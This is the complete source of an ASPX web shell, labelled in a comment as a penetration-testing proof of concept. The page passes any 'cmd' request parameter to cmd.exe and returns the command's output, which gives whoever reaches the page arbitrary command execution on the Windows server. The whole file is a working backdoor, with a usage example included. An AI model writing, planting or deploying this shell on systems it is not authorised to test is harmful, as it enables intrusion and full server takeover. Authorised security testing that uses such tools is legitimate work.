<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%
// Minimal ASPX Web Shell — VAPT PoC
// Usage: cmd.aspx?cmd=whoami
if (Request["cmd"] != null) {
    Process p = new Process();
    p.StartInfo.FileName = "cmd.exe";
    p.StartInfo.Arguments = "/c " + Request["cmd"];
    p.StartInfo.UseShellExecute = false;
    p.StartInfo.RedirectStandardOutput = true;
    p.StartInfo.RedirectStandardError = true;
    p.Start();
    Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd() + "</pre>");
}
%>
